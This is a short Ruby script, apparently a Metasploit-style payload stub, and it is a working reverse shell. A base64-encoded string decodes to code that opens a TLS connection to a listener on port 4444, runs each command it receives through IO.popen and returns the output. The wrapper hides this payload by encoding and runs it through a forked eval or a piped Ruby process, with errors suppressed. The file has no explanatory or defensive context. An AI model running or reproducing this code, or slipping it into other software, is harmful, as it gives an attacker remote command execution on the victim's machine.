code = %(cmVxdWlyZSAnc29ja2V0JztyZXF1aXJlICdvcGVuc3NsJztjPU9wZW5TU0w6OlNTTDo6U1NMU29ja2V0Lm5ldyhUQ1BTb2NrZXQubmV3KCIwLjAuMC4wIiwiNDQ0NCIpKS5jb25uZWN0O3doaWxlKGNtZD1jLmdldHMpO0lPLnBvcGVuKGNtZC50b19zLCJyIil7fGlvfGMucHJpbnQgaW8ucmVhZH1lbmQ=).unpack(%(m0)).first
if RUBY_PLATFORM =~ /mswin|mingw|win32/
inp = IO.popen(%(ruby), %(wb)) rescue nil
if inp
inp.write(code)
inp.close
end
else
if ! Process.fork()
eval(code) rescue nil
end
end